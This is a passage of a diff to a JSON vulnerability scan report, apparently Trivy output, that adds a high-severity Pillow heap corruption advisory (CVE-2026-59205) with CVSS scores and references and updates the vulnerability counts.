+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59205",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:a0dc307ef0b266b04f7041ee8423e038687ff80cf9c7d1f5d22af22e628ac580",
+          "Title": "Pillow: Pillow: Controlled native heap corruption in ImageCms.ImageCmsTransform.apply API",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow's ImageCms.ImageCmsTransform.apply(im, imOut) API can trigger controlled native heap corruption when the caller supplies an output image whose mode does not match the transform's declared output mode. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59205",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721",
+            "https://github.com/python-pillow/Pillow/pull/9715",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59205",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59205"
+          ],
+          "PublishedDate": "2026-07-14T16:17:02.37Z",
+          "LastModifiedDate": "2026-07-14T20:09:27.77Z"
         },
         {
           "VulnerabilityID": "CVE-2025-47273",
@@ -1693,7 +3389,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-24049"
           ],
           "PublishedDate": "2026-01-22T05:16:23.157Z",
-          "LastModifiedDate": "2026-06-30T03:17:36.743Z"
+          "LastModifiedDate": "2026-07-29T13:17:55.69Z"
         },
         {
           "VulnerabilityID": "CVE-2026-24049",
@@ -1816,14 +3512,14 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-24049"
           ],
           "PublishedDate": "2026-01-22T05:16:23.157Z",
-          "LastModifiedDate": "2026-06-30T03:17:36.743Z"
+          "LastModifiedDate": "2026-07-29T13:17:55.69Z"
         }
       ],
-      "vulnerability_count": 16
+      "vulnerability_count": 27
     }
   },
   "summary": {
     "total_versions_scanned": 2,
-    "total_vulnerabilities": 25
+    "total_vulnerabilities": 47
   }
 }
